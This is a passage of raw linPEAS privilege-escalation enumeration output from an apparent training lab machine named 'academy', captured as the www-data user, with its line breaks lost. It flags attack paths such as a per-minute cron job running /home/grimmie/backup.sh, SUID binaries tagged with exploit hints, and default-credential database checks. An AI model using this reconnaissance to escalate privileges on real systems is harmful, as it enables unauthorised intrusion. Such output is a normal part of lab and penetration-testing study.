Mar 18  2021 /lib/systemd/systemd-logind 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd[+] Cron jobs[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 -rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          /etc/cron.d:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rw-r--r--  1 root root  712 Dec 17  2018 php/etc/cron.daily:total 40drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.weekly:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  813 Feb 10  2019 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * /home/grimmie/backup.sh[+] Services[i] Search for outdated versions                                                                                                                                [ - ]  apache-htcacheclean                                                                                                                                     [ + ]  apache2 [ + ]  apparmor [ - ]  console-setup.sh [ + ]  cron [ + ]  dbus [ - ]  hwclock.sh [ - ]  keyboard-setup.sh [ + ]  kmod [ + ]  mysql [ + ]  networking [ + ]  procps [ - ]  rsync [ + ]  rsyslog [ + ]  ssh [ + ]  udev [ + ]  vsftpd===================================( Network Information )====================================[+] Hostname, hosts and DNS                                                                                                                                    academy                                                                                                                                                        127.0.0.1       localhost127.0.1.1       academy.tcm.sec academy::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersdomain localdomainsearch localdomainnameserver 172.16.2.2tcm.sec[+] Content of /etc/inetd.conf/etc/inetd.conf Not Found                                                                                                                                                                                                                                                                                                     [+] Networks and neighboursdefault         0.0.0.0                                                                                                                                        loopback        127.0.0.0link-local      169.254.0.01: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33       valid_lft 1638sec preferred_lft 1638sec    inet6 fe80::20c:29ff:fea6:6e61/64 scope link        valid_lft forever preferred_lft forever172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE[+] Iptables rulesiptables rules Not Found                                                                                                                                                                                                                                                                                                      [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                                                                                                                           [+] Can I sniff with tcpdump?No                                                                                                                                                                                                                                                                                                                            ====================================( Users Information )=====================================[+] My user                                                                                                                                                    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          [+] Do I have PGP keys?gpg Not Found                                                                                                                                                                                                                                                                                                                 [+] Clipboard or highlighted text?xsel and xclip Not Found                                                                                                                                                                                                                                                                                                      [+] Testing 'sudo -l' without password & /etc/sudoers[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                                                                                                                                          [+] Checking /etc/doas.conf/etc/doas.conf Not Found                                                                                                                                                                                                                                                                                                      [+] Checking Pkexec policy                                                                                                                                                               [+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                                                                                                                                             [+] Superusersroot:x:0:0:root:/root:/bin/bash                                                                                                                                [+] Users with consolegrimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   root:x:0:0:root:/root:/bin/bash[+] Login information 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                10:18   29:42   0.04s  0.01s -bashroot     tty1                          Sat May 29 13:31 - down   (00:12)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)root     tty1                          Sat May 29 13:16 - down   (00:11)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)administ tty1                          Sat May 29 13:06 - down   (00:08)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)wtmp begins Sat May 29 13:05:58 2021[+] All users_apt                                                                                                                                                           backupbindaemonftpgamesgnatsgrimmieirclistlpmailmanmessagebusmysqlnewsnobodyproxyrootsshdsyncsyssystemd-coredumpsystemd-networksystemd-resolvesystemd-timesyncuucpwww-data[+] Password policyPASS_MAX_DAYS   99999                                                                                                                                          PASS_MIN_DAYS   0PASS_WARN_AGE   7ENCRYPT_METHOD SHA512===================================( Software Information )===================================[+] MySQL version                                                                                                                                              mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      [+] MySQL connection using default root/root ........... No[+] MySQL connection using root/toor ................... No                                                                                                    [+] MySQL connection using root/NOPASS ................. No                                                                                                    [+] Looking for mysql credentials and exec                                                                                                                     From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     Found readable /etc/mysql/my.cnf[client-server]!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/[+] PostgreSQL version and pgadmin credentials Not Found                                                                                                                                                                                                                                                                                                                    [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                                                                                                                                      [+] Apache server infoVersion: Server version: Apache/2.4.38 (Debian)                                                                                                                Server built:   2020-08-25T20:08:29[+] Looking for PHPCookies Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Wordpress wp-config.php fileswp-config.php Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for Tomcat users filetomcat-users.xml Not Found                                                                                                                                                                                                                                                                                                    [+] Mongo information Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for supervisord configuration filesupervisord.conf Not Found                                                                                                                                                                                                                                                                                                    [+] Looking for cesi configuration filecesi.conf Not Found                                                                                                                                                                                                                                                                                                           [+] Looking for Rsyncd config file/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      [ftp]        comment = public archive        path = /var/www/pub        use chroot = yes        lock file = /var/lock/rsyncd        read only = yes        list = yes        uid = nobody        gid = nogroup        strict modes = yes        ignore errors = no        ignore nonreadable = yes        transfer logging = no        timeout = 600        refuse options = checksum dry-run        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz[+] Looking for Hostapd config filehostapd.conf Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for wifi conns file Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Anaconda-ks config filesanaconda-ks.cfg Not Found                                                                                                                                                                                                                                                                                                     [+] Looking for .vnc directories and their passwd files.vnc Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for ldap directories and their hashes/etc/ldap                                                                                                                                                      The password hash is from the {SSHA} to 'structural'[+] Looking for .ovpn files and credentials.ovpn Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for ssl/ssh filesPermitRootLogin yes                                                                                                                                            ChallengeResponseAuthentication noUsePAM yesLooking inside /etc/ssh/ssh_config for interesting infoHost *    SendEnv LANG LC_*    HashKnownHosts yes    GSSAPIAuthentication yes[+] Looking for unexpected auth lines in /etc/pam.d/sshdNo                                                                                                                                                                                                                                                                                                                            [+] Looking for Cloud credentials (AWS, Azure, GC)                                                                                                                                                               [+] NFS exports?[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         /etc/exports Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for kerberos conf files and tickets[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          krb5.conf Not Found                                                                                                                                            tickets kerberos Not Found                                                                                                                                     klist Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for Kibana yamlkibana.yml Not Found                                                                                                                                                                                                                                                                                                          [+] Looking for logstash files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for elasticsearch files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Vault-ssh filesvault-ssh-helper.hcl Not Found                                                                                                                                                                                                                                                                                                [+] Looking for AD cached hahsescached hashes Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for screen sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            screen Not Found                                                                                                                                                                                                                                                                                                              [+] Looking for tmux sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            tmux Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for Couchdb directory                                                                                                                                                               [+] Looking for redis.conf                                                                                                                                                               [+] Looking for dovecot filesdovecot credentials Not Found                                                                                                                                                                                                                                                                                                 [+] Looking for mosquitto.conf                                                                                                                                                               ====================================( Interesting Files )=====================================[+] SUID                                                                                                                                                       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    /usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chfn           --->    SuSE_9.3/10/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/usr/bin/newgrp         --->    HP-UX_10.20/usr/bin/umount         --->    BSD/Linux[1996-08-13]/usr/bin/chsh/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM/usr/bin/su/usr/bin/gpasswd[+] SGID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/sbin/unix_chkpwd                                                                                                                                          /usr/bin/bsd-write/usr/bin/expiry/usr/bin/wall/usr/bin/crontab/usr/bin/dotlockfile/usr/bin/chage/usr/bin/ssh-agent[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   /usr/bin/ping = cap_net_raw+ep                                                                                                                                 [+] .sh files in path/usr/bin/gettext.sh                                                                                                                                            [+] Files (scripts) in /etc/profile.d/total 20                                                                                                                                                       drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh[+] Hashes inside passwd file? ........... No[+] Can I read shadow files? ........... No                                                                                                                    [+] Can I read root folder? ........... No                                                                                                                                                                                                                                                                                    [+] Looking for root files in home dirs (limit 20)/home                                                                                                                                                          [+] Looking for root files in folders owned by me                                                                                                                                                               [+] Readable files belonging to root and readable by me but not world readable                                                                                                                                                               [+] Files inside /home/www-data (limit 20)                                                                                                                                                               [+] Files inside others home (limit 20)/home/grimmie/.bash_history                                                                                                                                    /home/grimmie/.bashrc/home/grimmie/backup.sh/home/grimmie/.profile/home/grimmie/.bash_logout[+] Looking for installed mail applications                                                                                                                                                               [+] Mails (limit 50)                                                                                                                                                               [+] Backup files?-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    -rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup[+] Looking for tables inside readable .db/.sqlite files (limit 100)                                                                                                                                                               [+] Web files?(output limit)/var/www/:                                                                                                                                                     total 12Kdrwxr-xr-x  3 root root 4.0K May 29  2021 .drwxr-xr-x 12 root root 4.0K May 29  2021 ..drwxr-xr-x  3 root root 4.0K May 29  2021 html/var/www/html:total 24Kdrwxr-xr-x 3 root     root     4.0K May 29  2021 .drwxr-xr-x 3 root     root     4.0K May 29  2021 ..[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            -rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      -rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                           270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             -rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0[+] Interesting writable Files[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 /dev/mqueue                                                                                                                                                    /dev/mqueue/linpeas.txt/dev/shm/run/lock/run/lock/apache2/sys/kernel/security/apparmor/.access/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/tmp/tmp/linpeas.sh/var/cache/apache2/mod_cache_disk/var/lib/php/sessions/var/lib/phpmyadmin/var/lib/phpmyadmin/tmp/var/lib/phpmyadmin/tmp/twig/var/lib/phpmyadmin/tmp/twig/15/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php/var/lib/phpmyadmin/tmp/twig/21/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php/var/lib/phpmyadmin/tmp/twig/22/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php/var/lib/phpmyadmin/tmp/twig/28/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php/var/lib/phpmyadmin/tmp/twig/2e/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php/var/lib/phpmyadmin/tmp/twig/31/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php/var/lib/phpmyadmin/tmp/twig/36/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php/var/lib/phpmyadmin/tmp/twig/3b/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php/var/lib/phpmyadmin/tmp/twig/41/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php/var/lib/phpmyadmin/tmp/twig/42/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php/var/lib/phpmyadmin/tmp/twig/43/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php/var/lib/phpmyadmin/tmp/twig/4c/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php/var/lib/phpmyadmin/tmp/twig/4e/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php/var/lib/phpmyadmin/tmp/twig/4f/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php/var/lib/phpmyadmin/tmp/twig/53/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php/var/lib/phpmyadmin/tmp/twig/5c/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php/var/lib/phpmyadmin/tmp/twig/61/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php/var/lib/phpmyadmin/tmp/twig/6b/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php/var/lib/phpmyadmin/tmp/twig/6c/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php/var/lib/phpmyadmin/tmp/twig/73/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php/var/lib/phpmyadmin/tmp/twig/78/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php/var/lib/phpmyadmin/tmp/twig/7d/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php/var/lib/phpmyadmin/tmp/twig/7f/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php/var/lib/phpmyadmin/tmp/twig/8a/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php/var/lib/phpmyadmin/tmp/twig/8b/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php/var/lib/phpmyadmin/tmp/twig/96/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php/var/lib/phpmyadmin/tmp/twig/97/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php/var/lib/phpmyadmin/tmp/twig/99/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php/var/lib/phpmyadmin/tmp/twig/9d/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php/var/lib/phpmyadmin/tmp/twig/9e/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php/var/lib/phpmyadmin/tmp/twig/a0/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php/var/lib/phpmyadmin/tmp/twig/a4/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php/var/lib/phpmyadmin/tmp/twig/a7/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php/var/lib/phpmyadmin/tmp/twig/ae/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php/var/lib/phpmyadmin/tmp/twig/af/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php/var/lib/phpmyadmin/tmp/twig/b6/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php/var/lib/phpmyadmin/tmp/twig/c3/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php/var/lib/phpmyadmin/tmp/twig/c5/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php/var/lib/phpmyadmin/tmp/twig/c7/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php/var/lib/phpmyadmin/tmp/twig/ca/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php/var/lib/phpmyadmin/tmp/twig/d6/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php/var/lib/phpmyadmin/tmp/twig/dd/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php/var/lib/phpmyadmin/tmp/twig/e8/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php/var/lib/phpmyadmin/tmp/twig/e9/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php/var/lib/phpmyadmin/tmp/twig/f5/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php/var/lib/phpmyadmin/tmp/twig/fa/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php/var/tmp/var/www/html/academy/var/www/html/academy/admin/var/www/html/academy/admin/assets/var/www/html/academy/admin/assets/css/var/www/html/academy/admin/assets/css/bootstrap.css/var/www/html/academy/admin/assets/css/font-awesome.css/var/www/html/academy/admin/assets/css/style.css/var/www/html/academy/admin/assets/fonts/var/www/html/academy/admin/assets/fonts/FontAwesome.otf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/admin/assets/img/var/www/html/academy/admin/assets/js/var/www/html/academy/admin/assets/js/bootstrap.js/var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/check_availability.php/var/www/html/academy/admin/course.php/var/www/html/academy/admin/department.php/var/www/html/academy/admin/edit-course.php/var/www/html/academy/admin/enroll-history.php/var/www/html/academy/admin/includes/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/includes/footer.php/var/www/html/academy/admin/includes/header.php/var/www/html/academy/admin/includes/menubar.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/level.php/var/www/html/academy/admin/logout.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/print.php/var/www/html/academy/admin/semester.php/var/www/html/academy/admin/session.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/admin/user-log.php/var/www/html/academy/assets/var/www/html/academy/assets/css/var/www/html/academy/assets/css/bootstrap.css/var/www/html/academy/assets/css/font-awesome.css/var/www/html/academy/assets/css/style.css/var/www/html/academy/assets/fonts/var/www/html/academy/assets/fonts/FontAwesome.otf/var/www/html/academy/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/assets/